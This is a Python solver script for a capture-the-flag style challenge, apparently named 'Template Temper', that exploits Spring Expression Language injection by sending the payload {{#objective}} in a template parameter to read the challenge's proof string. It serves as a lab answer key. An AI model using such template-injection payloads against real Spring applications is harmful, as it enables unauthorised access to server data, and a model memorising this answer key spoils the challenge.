#!/usr/bin/env python3
"""Solver for Template Temper (Spring Boot SpEL injection via {{expr}}).

Usage: python3 solve.py <base_url>

The app's App.class reads an objective file (env HUNTRESS_OBJECTIVE_PATH,
default /run/huntress/objective.txt), trims it, and binds it as the SpEL
variable `objective` in a StandardEvaluationContext used to evaluate any
`{{ ... }}` expression found in the `template` query/form parameter of the
feature route advertised by GET /api/clues (field "feature_route").

Because the objective string is bound directly into the evaluation context,
the proof can be read without any command execution by simply requesting
the expression `{{#objective}}`.
"""
import json
import sys
import time
import urllib.request
import urllib.parse


def fetch(url, data=None, timeout=20):
    req = urllib.request.Request(url, data=data)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.read().decode("utf-8", "replace")


def recover_proof(base_url: str) -> str:
    base_url = base_url.rstrip("/")
    clues = json.loads(fetch(f"{base_url}/api/clues"))
    feature_route = clues["feature_route"]

    qs = urllib.parse.urlencode({"template": "{{#objective}}"})
    time.sleep(0.8)
    html = fetch(f"{base_url}{feature_route}?{qs}")

    start = html.find("<pre>")
    end = html.find("</pre>", start)
    if start == -1 or end == -1:
        raise RuntimeError(f"unexpected response: {html!r}")
    return html[start + len("<pre>"):end].strip()


if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
    print(recover_proof(base))
